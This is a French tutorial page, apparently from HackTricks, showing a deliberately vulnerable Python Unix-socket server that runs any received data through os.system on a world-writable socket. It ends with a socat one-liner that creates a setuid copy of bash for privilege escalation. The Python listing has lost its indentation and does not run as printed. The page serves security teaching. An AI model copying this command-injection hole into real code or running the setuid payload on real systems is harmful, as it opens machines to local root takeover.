{{#include ../../banners/hacktricks-training.md}}

## Exemple de liaison de socket avec Python

Dans l'exemple suivant, un **socket unix est créé** (`/tmp/socket_test.s`) et tout ce qui est **reçu** va être **exécuté** par `os.system`. Je sais que vous ne trouverez pas cela dans la nature, mais le but de cet exemple est de voir à quoi ressemble un code utilisant des sockets unix et comment gérer l'entrée dans le pire des cas.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Exécutez** le code en utilisant python : `python s.py` et **vérifiez comment le socket écoute** :
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploitation**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
